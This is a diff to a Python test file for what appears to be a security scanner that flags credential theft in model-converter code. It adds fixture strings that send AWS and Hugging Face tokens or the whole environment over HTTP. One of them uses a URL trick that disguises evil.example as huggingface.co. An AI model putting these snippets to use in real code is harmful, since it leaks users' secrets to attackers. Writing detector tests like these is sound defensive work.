@@ -3162,6 +3162,58 @@ def test_a_host_based_network_api_refuses_the_hub_allowance():
     ) == []
 
 
+def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
+    """The hub is writable and multi-tenant, so "the destination is the hub" is
+    not on its own a reason to say nothing: a token with write scope can create
+    a public repository there and make it a channel anyone can read back. The
+    allowance is for the shape upstream actually has, a token-authenticated
+    download, and refuses everything else.
+    """
+    scan_converter_source = _load(
+        "converter_scan_shape_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    hub = 'HUB = "https://huggingface.co/api/models"\n'
+
+    def _findings(body):
+        return [
+            f.check
+            for f in scan_converter_source('import os\nimport requests\n' + hub + body)
+        ]
+
+    # Sending to the hub is not downloading from it.
+    assert _findings('requests.post(HUB, data = os.environ["AWS_SECRET_ACCESS_KEY"])\n')
+    assert _findings('requests.post(HUB, data = os.environ["HF_TOKEN"])\n')
+    # A secret that is not the hub's own token has no business going there.
+    assert _findings(
+        'requests.get(HUB, headers = {"a": os.environ["AWS_SECRET_ACCESS_KEY"]})\n'
+    )
+    # Nor does the whole environment.
+    assert _findings('requests.get(HUB, params = dict(os.environ))\n')
+    # httpx is a sink the network rule recognises, so its writes count too, as
+    # do the ones made through a session or client object.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport httpx\n' + hub
+            + 'httpx.post(HUB, data = os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\nimport requests\n' + hub
+            + 'session = requests.Session()\n'
+            + 'session.put(HUB, data = os.environ["HF_TOKEN"])\n'
+        )
+    ]
+
+    # The shape upstream has: a hub token, sent as authentication, on a read.
+    assert _findings(
+        'requests.get(HUB, headers = {"Authorization": "Bearer " + os.environ["HF_TOKEN"]})\n'
+    ) == []
+    assert _findings(
+        'requests.head(HUB, headers = {"Authorization": os.environ.get("HF_TOKEN")})\n'
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
@@ -3182,7 +3234,11 @@ def test_the_hub_narrowing_does_not_reach_any_other_rule():
 
 
 def test_the_hub_allowance_reads_the_real_hostname():
-    """`https://huggingface.co:443@evil.example/collect` sends the request to
+    """Reads throughout, deliberately: the allowance refuses a write to the hub
+    outright, so a POST here would make every case pass without the hostname
+    check doing anything.
+
+    `https://huggingface.co:443@evil.example/collect` sends the request to
     evil.example: everything before the @ is user information. Taking the
     authority up to the first colon read it as huggingface.co, which turned the
     allowance into a way to post HF_TOKEN anywhere and have this say nothing.
@@ -3197,7 +3253,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
                 'import os\n'
                 'import requests\n'
                 f'URL = "{url}"\n'
-                'requests.post(URL, data = {"t": os.environ["HF_TOKEN"]})\n'
+                'requests.get(URL, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
             )
         ]
 
@@ -3217,7 +3273,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
             'import requests\n'
             'HUB = "https://huggingface.co/api/models"\n'
             'OUT = "https:///collect"\n'
-            'requests.post(OUT, data = {"t": os.environ["HF_TOKEN"]})\n'
+            'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
         )
     ]
 
@@ -3233,7 +3289,7 @@ def test_the_hub_allowance_reads_the_real_hostname():
                 'import requests\n'
                 'HUB = "https://huggingface.co/api/models"\n'
                 f'OUT = {destination}\n'
-                'requests.post(OUT, data = {"t": os.environ["HF_TOKEN"]})\n'
+                'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
             )
         ]
 
